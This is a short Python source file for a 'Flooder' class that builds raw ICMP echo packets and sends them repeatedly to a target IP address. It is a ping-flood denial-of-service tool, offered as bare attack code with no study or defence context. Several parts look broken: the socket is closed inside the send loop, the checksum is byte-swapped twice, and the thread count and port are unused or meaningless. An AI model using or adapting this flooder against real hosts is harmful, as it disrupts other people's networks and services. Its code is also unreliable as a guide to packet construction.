from struct import pack
from time import time, sleep

from socket import (
    socket,
    htons,
    inet_aton,
    AF_INET,
    SOCK_RAW,
    IPPROTO_ICMP
)


class Flooder(object):
    def __init__(self, threads: int):
        self.threads = threads
        self.running_status = True

    @staticmethod
    def _checksum(message) -> int:
        summary = 0
        for i in range(0, len(message), 2):
            w = message[i] + (message[i + 1] << 8)
            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
        return htons(~summary & 0xffff)

    def _construct_packet(self, length: int):
        header = pack("bbHHh", 8, 0, 0, 1, 1)
        data = (length - 50) * 'Q'
        data = pack("d", time()) + data.encode('ascii')
        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
        return header + data

    def run_flooding(self, ip: str, port: int, length: int, frequency: float) -> None:
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
        inet_aton(ip)

        while self.running_status:
            packet = self._construct_packet(length)
            sock.sendto(packet, (ip, port))
            sleep(frequency)
            sock.close()
